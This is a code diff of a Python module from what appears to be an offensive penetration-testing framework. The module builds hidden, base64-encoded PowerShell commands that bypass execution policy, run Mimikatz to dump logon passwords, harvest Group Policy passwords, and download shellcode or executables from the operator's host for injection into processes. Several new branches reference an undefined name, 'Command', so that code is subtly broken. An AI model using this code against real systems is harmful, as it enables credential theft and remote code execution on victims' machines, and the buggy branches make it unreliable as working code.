@@ -2,27 +2,23 @@ from base64 import b64encode
 import logging
 import settings
 
-def ps_command(command, mimikatz=False):
+def ps_command(command, arch):
     logging.info('PS command to be encoded: ' + command)
 
     if settings.args.server == 'https':
         logging.info('Disabling certificate checking for the following PS command: ' + command)
         command = "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};" + command
 
-    if not mimikatz:
-        # get the correct PowerShell path and set it temporarily to %pspath%
-        triggerCMD = "if %PROCESSOR_ARCHITECTURE%==x86 (set pspath='') else (set pspath=%WinDir%\\syswow64\\windowspowershell\\v1.0\\)&"
-
-        # invoke PowerShell with the appropriate options
-        # triggerCMD += "call %pspath%powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " + encCMD
-        triggerCMD += ' call %pspath%powershell.exe -NoP -NonI -W Hidden -Enc {}'.format(b64encode(command.encode('UTF-16LE')))
+    if arch == 32:
+        logging.info('Forcing the following command to execute in a 32bit PS process: ' + command)
+        command = '%SystemRoot%\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
     
-    else:
-        triggerCMD = 'powershell.exe -NoP -NonI -W Hidden -Enc {}'.format(b64encode(command.encode('UTF-16LE')))
+    elif arch == 64 or arch == 'auto':
+        command = 'powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
+    
+    logging.info('Full PS command: ' + command)
 
-    logging.info('Full PS command: ' + triggerCMD)
-
-    return triggerCMD
+    return command
 
 class PowerShell:
 
@@ -33,6 +29,7 @@ class PowerShell:
     def __init__(self, server, localip):
         self.localip = localip
         self.protocol = server
+        self.arch = settings.args.ps_arch
         self.func_name = settings.obfs_func_name
 
     def mimikatz(self, command='privilege::debug sekurlsa::logonpasswords exit'):
@@ -54,7 +51,10 @@ class PowerShell:
                                           addr=self.localip,
                                           katz_command=command)
 
-        return ps_command(command, mimikatz=True)
+        if self.arch == 'auto':
+            return ps_command(command, 64)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def gpp_passwords(self):
         command = """
@@ -73,7 +73,10 @@ class PowerShell:
                                           port=settings.args.server_port,
                                           addr=self.localip)
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 64)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def powerview(self, command):
 
@@ -93,8 +96,10 @@ class PowerShell:
                                           addr=self.localip,
                                           view_command=command)
 
-
-        return ps_command(command, int(self.arch))
+        if self.arch == 'auto':
+            return ps_command(command, 64)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def inject_meterpreter(self):
         #PowerSploit's 3.0 update removed the Meterpreter injection options in Invoke-Shellcode
@@ -125,7 +130,10 @@ class PowerShell:
         if settings.args.procid:
             command += " -ProcessID {}".format(settings.args.procid)
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 32)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def inject_shellcode(self):
         command = """
@@ -133,17 +141,20 @@ class PowerShell:
         $WebClient = New-Object System.Net.WebClient;
         [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}:{port}/{shellcode}');
         Invoke-{func_name} -Force -Shellcode $bytes""".format(protocol=self.protocol,
-                                                       port=settings.args.server_port,
-                                                       func_name=self.func_name,
-                                                       addr=self.localip,
-                                                       shellcode=settings.args.path.split('/')[-1])
+                                                              port=settings.args.server_port,
+                                                              func_name=self.func_name,
+                                                              addr=self.localip,
+                                                              shellcode=settings.args.path.split('/')[-1])
 
         if settings.args.procid:
             command += " -ProcessID {}".format(settings.args.procid)
 
         command += ';'
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 32)
+        else:
+            return ps_command(Command, int(self.arch))
 
     def inject_exe_dll(self):
         command = """
@@ -151,10 +162,10 @@ class PowerShell:
         $WebClient = New-Object System.Net.WebClient;
         [Byte[]]$bytes = $WebClient.DownloadData('{protocol}://{addr}:{port}/{pefile}');
         Invoke-{func_name} -PEBytes $bytes""".format(protocol=self.protocol,
-                                              port=settings.args.server_port,
-                                              func_name=self.func_name,
-                                              addr=self.localip,
-                                              pefile=settings.args.path.split('/')[-1])
+                                                     port=settings.args.server_port,
+                                                     func_name=self.func_name,
+                                                     addr=self.localip,
+                                                     pefile=settings.args.path.split('/')[-1])
 
         if settings.args.procid:
             command += " -ProcId {}"
@@ -164,4 +175,7 @@ class PowerShell:
 
         command += ';'
 
-        return ps_command(command)
+        if self.arch == 'auto':
+            return ps_command(command, 32)
+        else:
+            return ps_command(Command, int(self.arch))
